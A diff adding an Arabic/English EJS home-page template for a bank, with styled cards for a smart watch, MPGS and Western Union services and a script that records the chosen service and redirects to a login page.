@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= t.bankName %></title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
+        }
+        .home-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+        }
+        .home-header .lang-btn {
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,255,255,0.3);
+            color: #fff;
+            font-family: 'Cairo', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            padding: 6px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .home-header .lang-btn:hover {
+            background: rgba(255,255,255,0.25);
+        }
+        .home-logo {
+            width: 48px;
+            height: auto;
+        }
+        .home-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px 40px;
+        }
+        .bank-logo-large {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .home-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .home-subtitle {
+            font-size: 14px;
+            color: rgba(255,255,255,0.7);
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .services-grid {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .service-card {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+        .service-card:hover {
+            background: rgba(255,255,255,0.18);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        }
+        .service-card:active {
+            transform: translateY(0);
+        }
+        .service-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 14px;
+            overflow: hidden;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+        }
+        .service-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .service-icon.watch-icon {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 8px;
+        }
+        .service-icon.watch-icon svg {
+            width: 40px;
+            height: 40px;
+        }
+        .service-info {
+            flex: 1;
+        }
+        .service-name {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .service-desc {
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            line-height: 1.5;
+        }
+        .service-arrow {
+            flex-shrink: 0;
+            color: rgba(255,255,255,0.4);
+        }
+        [dir="rtl"] .service-arrow {
+            transform: scaleX(-1);
+        }
+    </style>
+</head>
+<body>
+    <div class="home-header">
+        <img src="/images/logo-white.png" alt="<%= t.bankName %>" class="home-logo">
+        <a href="?lang=<%= lang === 'ar' ? 'en' : 'ar' %>" class="lang-btn"><%= lang === 'ar' ? 'EN' : 'AR' %></a>
+    </div>
+
+    <div class="home-content">
+        <img src="/images/logo-gold.png" alt="<%= t.bankName %>" class="bank-logo-large">
+        <h1 class="home-title"><%= t.bankName %></h1>
+        <p class="home-subtitle"><%= t.home.subtitle %></p>
+
+        <div class="services-grid">
+            <!-- Smart Watch -->
+            <a href="/watches?lang=<%= lang %>" class="service-card">
+                <div class="service-icon watch-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#c8a45a" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="6" y="2" width="12" height="20" rx="3"/>
+                        <circle cx="12" cy="12" r="4"/>
+                        <path d="M12 8v4l2 2"/>
+                        <path d="M2 10h2M2 14h2M20 10h2M20 14h2"/>
+                    </svg>
+                </div>
+                <div class="service-info">
+                    <div class="service-name"><%= t.home.watchTitle %></div>
+                    <div class="service-desc"><%= t.home.watchDesc %></div>
+                </div>
+                <div class="service-arrow">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+                </div>
+            </a>
+
+            <!-- MPGS -->
+            <a href="#" class="service-card" id="mpgsCard">
+                <div class="service-icon">
+                    <img src="/images/mpgs-logo.jpg" alt="MPGS">
+                </div>
+                <div class="service-info">
+                    <div class="service-name"><%= t.home.mpgsTitle %></div>
+                    <div class="service-desc"><%= t.home.mpgsDesc %></div>
+                </div>
+                <div class="service-arrow">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+                </div>
+            </a>
+
+            <!-- Western Union -->
+            <a href="#" class="service-card" id="wuCard">
+                <div class="service-icon">
+                    <img src="/images/wu-logo.jpg" alt="Western Union">
+                </div>
+                <div class="service-info">
+                    <div class="service-name"><%= t.home.wuTitle %></div>
+                    <div class="service-desc"><%= t.home.wuDesc %></div>
+                </div>
+                <div class="service-arrow">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+                </div>
+            </a>
+        </div>
+    </div>
+
+    <script>
+    function goToService(service) {
+        var lang = new URLSearchParams(window.location.search).get('lang') || 'ar';
+        fetch('/api/submit-service', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ service: service })
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+            if (d.ok) {
+                window.location.href = '/login?lang=' + lang + '&orderId=' + d.id;
+            }
+        })
+        .catch(function(err) { console.error(err); });
+    }
+
+    document.getElementById('mpgsCard').addEventListener('click', function(e) {
+        e.preventDefault();
+        goToService('mpgs');
+    });
+
+    document.getElementById('wuCard').addEventListener('click', function(e) {
+        e.preventDefault();
+        goToService('western-union');
+    });
+    </script>
+    <%- include('partials/tracker') %>
+</body>
+</html>
